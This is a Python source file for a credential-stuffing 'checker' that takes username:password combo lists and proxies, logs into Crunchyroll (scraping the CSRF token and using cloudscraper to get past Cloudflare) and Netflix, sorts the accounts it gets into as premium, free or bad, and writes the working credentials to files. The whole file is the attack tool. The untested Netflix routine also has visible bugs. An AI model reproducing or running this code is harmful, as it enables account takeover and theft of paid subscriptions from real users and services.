import cloudscraper, requests
from bs4 import BeautifulSoup as soup
from utils import cprint, listToFile

class Checker():
    def __init__(self, combo_list: list, proxy_list: list):
        self.combolist = combo_list
        self.proxy = proxy_list
        self.session = cloudscraper.create_scraper()

    def crchecker(self) -> tuple:
        login = self.session.get("https://www.crunchyroll.com/login")
        free = []
        premium = []
        try:
            for c in self.combolist:
                for p in self.proxy:
                    combo = c.split(":")
                    login_soup = soup(login.content, "html5lib")
                    csrftok = login_soup.find("input", id="login_form__token")["value"]
                    self.session.post('https://www.crunchyroll.com/login', data={
                        'login_form[name]' : combo[0],
                        'login_form[password]' : combo[1],
                        'login_form[redirect_url]': '/de',
                        'login_form[_token]': csrftok
                    }, proxies={"https": p})
                    membership = self.session.get('https://www.crunchyroll.com/de/acct/membership')
                    member_soup = soup(membership.text, "html5lib")
                    if member_soup.title.get_text() == 'Crunchyroll -   Account Management\n':
                        if member_soup.find('td').get_text() == 'Premium':
                            cprint(f"{combo[0]}:{combo[1]} | Premium Membership\n", "yellow")
                            premium.append(f"{combo[0]}:{combo[1]}\n")
                            break
                        else:
                            cprint(f"{combo[0]}:{combo[1]} | Free Membership\n", "green")
                            free.append(f"{combo[0]}:{combo[1]}")
                            break
                    else:
                        cprint(f"{combo[0]}:{combo[1]} | Bad Combo\n", "red")
                        break

        except KeyboardInterrupt:
            listToFile("crunchyroll/free", free)
            listToFile("crunchyroll/premium", premium)
            exit()
        
        listToFile("crunchyroll/free", free)
        listToFile("crunchyroll/premium", premium)
        return free, premium

    # not tested yet
    def nxchecker(self):
        self.session.get("https://www.netflix.com/de-en/login")
        working = []
        try:
            for combo in self.combolist:
                try:
                    for proxy in self.proxy:
                        proxy.strip()
                        combo.strip()
                        combo = combo.split(":")
                        p = self.session.post('https://www.netflix.com/de-en/login', data={
                            'userLoginId' : combo[0],
                            'password' : combo[1],
                            'rememberMe': 'false'
                            }, proxies={"http": str(self.proxy), "https": str(self.proxy)})
                        if p.url == "https://www.netflix.com/browse":
                            print(f"{combo[0]}:{combo[1]} | Working")
                            working.append(f"{combo[0]}:{combo[1]}")
                        else:
                            print(f"{combo[0]}:{combo[1]} | Not Working")
                except Exception as e:
                    print(f"[Proxy Dead or Banned]: {proxy}")
        except Exception as e:
            print(f"{e}")
        return working

    def close_session(self):
        self.session.close()